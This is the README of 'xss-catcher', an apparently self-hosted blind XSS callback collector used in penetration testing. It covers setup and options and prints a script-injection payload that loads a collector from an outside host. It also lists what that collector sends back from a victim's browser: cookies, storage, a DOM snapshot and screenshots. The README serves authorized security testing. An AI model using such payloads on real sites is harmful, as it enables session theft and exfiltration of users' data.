# xss-catcher

Self-hosted blind XSS callback collector. Deploy on a server you control, inject payloads into a target, and captures arrive in a dashboard with cookies, storage, DOM snapshots, and screenshots.

## Requirements

- Node.js 22 or later (uses the built-in `node:sqlite` module)

## Install

```bash
npm install
```

## Run

```bash
node --experimental-sqlite server.js [options]
```

### Options

| Flag | Alias | Default | Description |
|------|-------|---------|-------------|
| `--user` | `-u` | *(required)* | Dashboard login username |
| `--pass` | `-p` | *(required, min 12 chars)* | Dashboard login password |
| `--host` | `-H` | `0.0.0.0` | Bind address |
| `--port` | | `80` | Port (binding below 1024 needs root) |
| `--base-url` | | *(auto)* | Externally reachable URL — baked into collector scripts |
| `--cert` | | | Path to TLS certificate PEM file |
| `--key` | | | Path to TLS private key PEM file |

All options can also be set via environment variables: `USER_NAME`, `PASSWORD`, `HOST`, `PORT`, `BASE_URL`, `CERT`, `KEY`.

### Example

```bash
node --experimental-sqlite server.js \
  -u operator \
  -p correct-horse-battery \
  --port 8080 \
  --base-url https://xss.yourdomain.com

# With TLS (Let's Encrypt paths shown as example)
node --experimental-sqlite server.js \
  -u operator \
  -p correct-horse-battery \
  --cert /etc/letsencrypt/live/xss.yourdomain.com/fullchain.pem \
  --key  /etc/letsencrypt/live/xss.yourdomain.com/privkey.pem \
  --base-url https://xss.yourdomain.com
```

## Usage

### 1. Generate a payload

Open the dashboard → **Payloads** tab, enter a hook name, copy a payload variant.

Hook names are arbitrary labels that group captures (e.g. one per engagement or target).

**Callback host** controls the address baked into the generated payloads. It defaults to whatever origin the dashboard is served from — so browsing the dashboard at `http://localhost` produces `localhost` payloads, which won't fire from a victim's browser. Set it to the address the target can actually reach:

```
10.10.14.5                 → http://10.10.14.5/c/hook-name
10.10.14.5:8080            → http://10.10.14.5:8080/c/hook-name
https://xss.yourdomain.com → https://xss.yourdomain.com/c/hook-name
```

A bare host or `host:port` gets the dashboard's current scheme; include `https://` explicitly to force TLS. The value is saved in browser localStorage and applies to every payload variant plus the collector endpoint shown under **Settings**. Leave it blank to fall back to the dashboard origin.

### 2. Inject the payload

Deliver the payload wherever you suspect unsanitized output — stored XSS in a form field, header injection, PDF renderer, email client, etc.

```
'"><script src=https://xss.yourdomain.com/c/hook-name></script>
```

When the payload fires in a victim's browser, the collector script runs and POSTs back:

- Page URI
- Cookies
- LocalStorage / SessionStorage
- DOM snapshot
- Referrer, User-Agent, Origin, Language, GPU
- Screenshot (via html2canvas)

### 3. Review captures

Open the dashboard → **Captures** tab. Each row shows the URL, hook, IP, and whether cookies/localStorage/sessionStorage were captured. Click a row to see the full capture including the screenshot and raw data.

## Routes

| Route | Auth | Purpose |
|-------|------|---------|
| `GET /c/:hook` | Public | Serves the collector JavaScript |
| `POST /c/:hook` | Public | Receives a callback from a victim browser |
| `GET /h2c.js` | Public | Serves html2canvas (used for screenshots) |
| `GET /login` | Public | Login page |
| `POST /login` | Public | Authenticate, set session cookie |
| `POST /logout` | — | Clear session, redirect to login |
| `GET /` | Session | Dashboard |
| `GET /api/*` | Session | JSON API |

The collector endpoints are intentionally unauthenticated so payloads can phone home from any origin. Everything else requires a valid session.

## Data

Captures are stored in a SQLite database at `captures.db` (configurable via `DB_PATH`). The file is created automatically on first run.

## Notes

- Set `--base-url` to your public domain when running behind a reverse proxy, otherwise collector scripts will use the `Host` header to build their callback URL.
- Screenshots require the victim page to load `/h2c.js` from your server. Pages with a strict `script-src` CSP that blocks your domain will send the capture without a screenshot.
- **Use payloads only on systems you have explicit permission to test.**
